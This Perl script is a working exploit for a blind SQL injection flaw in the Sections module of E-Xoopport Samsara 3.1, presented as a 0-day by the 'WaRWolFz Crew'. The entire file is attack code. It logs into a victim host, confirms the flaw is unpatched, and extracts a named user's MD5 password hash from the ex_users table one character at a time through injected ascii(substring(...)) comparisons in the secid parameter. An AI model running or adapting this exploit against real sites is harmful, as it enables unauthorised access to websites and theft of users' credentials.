#!/usr/bin/perl
# [0-Day] E-Xoopport - Samsara <= v3.1 (Sections Module 2) Remote Blind SQL Injection Exploit
# Author/s: _mRkZ_ & Dante90, WaRWolFz Crew
# Created: 2010.09.12 after 0 days the bug was discovered.
# Web Site: www.warwolfz.org

use LWP::UserAgent;
use HTTP::Cookies;
use HTTP::Request::Common;

$^O eq 'MSWin32' ? system('cls') : system('clear');

print "
E-Xoopport - Samsara <= v3.1 (Sections Module) Remote Blind SQL Injection Exploit
+---------------------------------------------------+
| Script: E-Xoopport                                |
| Affected versions: 3.1                            |
| Bug: Remote Blind SQL Injection (Sections Module) |
| Author/s: _mRkZ_ & Dante90, WaRWolFz Crew         |
| Web Site: www.warwolfz.org                        |
+---------------------------------------------------+
";

if (@ARGV != 4) {
	print "\r\nUsage: perl expolit_name.pl <VictimeHost> <YourNick> <YourPass> <NickToHack>\r\n";
	exit;
}

$host    = $ARGV[0];
$usr     = $ARGV[1];
$pwd     = $ARGV[2];
$anickde = $ARGV[3];
$anick   = '0x'.EncHex($anickde);

print "[+] Logging In...\r\n";
my %postdata = (
	uname => "$usr",
	pass => "$pwd"
);
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla 5.0");
my $req		= (POST $host, \%postdata);
my $cookies = HTTP::Cookies->new();
$request	= $ua->request($req);
$ua->cookie_jar($cookies);
$content	= $request->content;
if ($content =~ /<head><meta http-equiv="Refresh" content="0; URL=modules\/news\/" \/><\/head>/i) {
	print "[+] Logged in\r\n";
} else {
	print "[-] Fatal Error: username/password incorrect?\r\n";
	exit;
}

print "[!] Retriving section id...\r\n";
$idi = 0;
while ($idi != 11) {
	$idi++;
	$ua = LWP::UserAgent->new;
	$ua->agent("Mozilla 5.0");
	my $req		= $host."/modules/sections/index.php?op=listarticles&secid=$idi";
	$request	= $ua->get($req);
	$ua->cookie_jar($cookies);
	$content	= $request->content;
	if ($content =~ /<center>Ecco i documenti della sezione <b>(.+)<\/b>/ig) {
		$secid = $idi;
		last;
	}
}

if(!defined $secid) {
	print "[-] Fatal Error: Section id not found!\r\n";
	exit;
} else {
	print "[+] Section id '$secid' retrieved\r\n";
}

print "[!] Checking path...\r\n";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla 5.0");
my $req		= $host."/modules/sections/index.php?op=listarticles&secid=$secid";
$request	= $ua->get($req);
$ua->cookie_jar($cookies);
$content	= $request->content;
if ($content =~ /Ecco i documenti della sezione/i) {
	print "[+] Correct Path\r\n";
} else {
	print "[-] Fatal Error: Wrong Path\r\n";
	exit;
}

print "[!] Checking if vulnerability has been fixed...\r\n";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla 5.0");
my $req		= $host."/modules/sections/index.php?op=listarticles&secid=$secid+AND+1=1";
$request	= $ua->get($req);
$ua->cookie_jar($cookies);
$content	= $request->content;
if ($content =~ /<center>Ecco i documenti della sezione <b>(.+)<\/b>/ig) {
	print "[+] Vulnerability has not been fixed...\r\n";
} else {
	print "[-] Fatal Error: Vulnerability has been fixed\r\n";
	open LOGG, ">log.html";
	print LOGG $content;
	close LOGG;
	exit;
}

print "[!] Checking nick to hack...\r\n";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla 5.0");
my $req		= $host."/modules/sections/index.php?op=listarticles&secid=$secid+AND+ascii(substring((SELECT+pass+FROM+ex_users+WHERE+uname=$anick+LIMIT+0,1),32,1))>0";
$request	= $ua->get($req);
$ua->cookie_jar($cookies);
$content	= $request->content;
if ($content =~ /<center>Ecco i documenti della sezione <b>(.+)<\/b>/ig) {
	print "[+] Nick exists...\r\n";
} else {
	print "[-] Fatal Error: Nick does not exists\r\n";
	exit;
}

print "[!] Exploiting...\r\n";
my $i = 1;
while ($i != 33) {
	my $wn	= 47;
	while (1) {
		$wn++;
		$ua = LWP::UserAgent->new;
		$ua->agent("Mozilla 5.0");
		my $req		= $host."/modules/sections/index.php?op=listarticles&secid=$secid+AND+ascii(substring((SELECT+pass+FROM+ex_users+WHERE+uname=$anick+LIMIT+0,1),$i,1))=$wn";
		$request	= $ua->get($req);
		$ua->cookie_jar($cookies);
		$content	= $request->content;
		if ($content =~ /<center>Ecco i documenti della sezione <b>(.+)<\/b>/ig) {
			$pwdchr .= chr($wn);
			$^O eq 'MSWin32' ? system('cls') : system('clear');
			PrintChars($anickde, $pwdchr, $secid);
			last;
		}
	}
	$i++;
}

print "\r\n[+] Exploiting completed!\r\n\r\n";
print "Visit: www.warwolfz.net\r\n\r\n";

sub PrintChars {
$anick1 = $_[0];
$chars = $_[1];
$secid = $_[2];
print "
E-Xoopport - Samsara <= v3.1 (Sections Module) Remote Blind SQL Injection Exploit
+---------------------------------------------------+
| Script: E-Xoopport                                |
| Affected versions: 3.1                            |
| Bug: Remote Blind SQL Injection (Sections Module) |
| Author/s: _mRkZ_ & Dante90, WaRWolFz Crew         |
| Web Site: www.warwolfz.org                        |
+---------------------------------------------------+
[+] Logging In...
[+] Logged in
[!] Retriving section id...
[+] Section id '$secid' retrived
[!] Checking path...
[+] Correct Path
[!] Checking if vulnerability has been fixed...
[+] Vulnerability has not been fixed...
[!] Checking nick to hack...
[+] Nick exists...
[!] Exploiting...
[+] ".$anick1."'s md5 Password: $chars
";
}

sub EncHex {
	$char = $_[0];
	chomp $char;
	@trans = unpack("H*", "$char");
	return $trans[0];
}